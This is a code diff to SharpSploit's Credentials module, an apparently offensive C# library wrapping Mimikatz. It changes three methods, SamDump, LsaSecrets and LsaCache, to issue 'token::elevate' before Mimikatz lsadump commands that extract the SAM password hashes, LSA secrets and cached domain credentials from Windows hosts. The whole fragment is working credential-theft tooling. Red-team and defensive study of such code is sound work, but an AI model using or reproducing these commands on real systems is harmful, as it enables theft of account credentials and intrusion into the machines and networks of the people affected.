@@ -120,7 +120,7 @@ namespace SharpSploit.Credentials
         /// <returns>Mimikatz output.</returns>
 		public static string SamDump()
         {
-			return Command("privilege::debug lsadump::sam");
+			return Command("token::elevate lsadump::sam");
         }
 
         /// <summary>
@@ -130,7 +130,7 @@ namespace SharpSploit.Credentials
         /// <returns>Mimikatz output.</returns>
 		public static string LsaSecrets()
         {
-            return Command("privilege::debug lsadump::secrets");
+            return Command("token::elevate lsadump::secrets");
         }
 
         /// <summary>
@@ -141,7 +141,7 @@ namespace SharpSploit.Credentials
         /// <returns>Mimikatz output.</returns>
 		public static string LsaCache()
         {
-            return Command("privilege::debug lsadump::cache");
+            return Command("token::elevate lsadump::cache");
         }
 
         /// <summary>
